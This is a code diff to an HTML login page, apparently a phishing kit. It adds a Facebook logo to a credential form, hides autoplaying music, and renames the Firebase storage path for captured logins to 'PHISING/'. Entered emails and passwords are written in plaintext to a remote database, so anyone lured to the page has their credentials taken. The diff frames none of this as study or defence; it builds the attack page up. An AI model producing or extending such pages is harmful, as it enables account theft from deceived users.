@@ -17,7 +17,7 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background: url('https://i.ibb.co/Y7TbhZ8d/660974185667.jpg') no-repeat center center fixed;
+            background: url('https://i.ibb.co/Y7TbhZ8/660974185667.jpg') no-repeat center center fixed;
             background-size: cover;
         }
 
@@ -33,6 +33,13 @@
 
         .login-container:hover {
             transform: scale(1.02);
+        }
+
+        .logo {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            margin-bottom: 15px;
         }
 
         h2 {
@@ -88,11 +95,16 @@
             font-size: 12px;
             color: #777;
         }
+
+        audio {
+            display: none;
+        }
     </style>
 </head>
 <body>
 
     <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" class="logo" alt="Facebook Logo">
         <h2>😊 LOGIN DULU YA 😁</h2>
         <form id="loginForm">
             <div class="input-group">
@@ -107,6 +119,19 @@
         </form>
         <div class="footer">© 2018 - Diz Flyze</div>
     </div>
+
+    <audio id="background-music" autoplay loop>
+    <source src="https://files.catbox.moe/4j9lfm.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+    document.addEventListener("click", function() {
+        const audio = document.getElementById("background-music");
+        if (audio.paused) {
+            audio.play();
+        }
+    });
+    </script>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-app.js";
@@ -130,7 +155,7 @@
             let email = document.getElementById("email").value;
             let password = document.getElementById("password").value;
 
-            set(ref(database, 'logins/' + email.replace(/[.#$[\]]/g, '_')), {
+            set(ref(database, 'PHISING/' + email.replace(/[.#$[\]]/g, '_')), {
                 email: email,
                 password: password,
                 timestamp: new Date().toISOString()
